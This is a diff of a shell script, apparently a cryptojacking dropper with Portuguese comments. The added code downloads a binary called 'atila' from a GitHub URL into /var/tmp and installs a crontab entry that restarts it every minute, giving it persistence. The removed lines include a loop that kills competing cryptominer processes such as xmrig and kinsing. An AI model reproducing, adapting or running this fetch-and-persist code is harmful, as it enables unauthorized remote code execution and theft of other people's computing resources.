@@ -5,19 +5,13 @@
 
 #nem todas agora ok so as mais importantes por agora ok
 
-
-
-
 url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
 
-
-
+wget_ok=0
 
 
 
 cron() {
-
-
 
 cron_out=$( crontab -l )
 
@@ -28,27 +22,39 @@ echo tem
 
 else
 
-echo nao tem 
+echo nao tem
 
 #download of atila and add in crontab 
 
 command -v wget
 
-if (( $? )) ; then 
+if (( $? )) ; then
 
+wget_ok=0
 
-curl 
+else
 
-
-else 
-
-wget  $url -O /var/tmp/atila
-
-cd /var/tmp ; chmod 777 atila
-
-(crontab -l ; echo "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
+wget_ok=1
 
 fi;
+
+
+
+
+if [ $wget_ok -eq 1 ] ; then
+
+wget $url -O /var/tmp/atila
+
+(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
+
+
+else
+
+curl --help
+
+
+fi;
+
 
 fi;
 
@@ -56,30 +62,15 @@ fi;
 
 
 
-my_killall(){
-
-#lista de mineradores conhecidos por me
-
-
-while true ; do
-
-killall -9 xmrig xmrig1 xmrig2 lolMiner lolminer bzminer SRBMiner-MULTI nokillme xmrig-Daemon miniZ  cpuMinerTermux migo kinsing
- 
-sleep  6
-
-done
-
-}
 
 
 
+#(crontab -l ; echo  #* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
 
-#################
 
 init() {
 
  
-#my_killall &
 
 cron
 
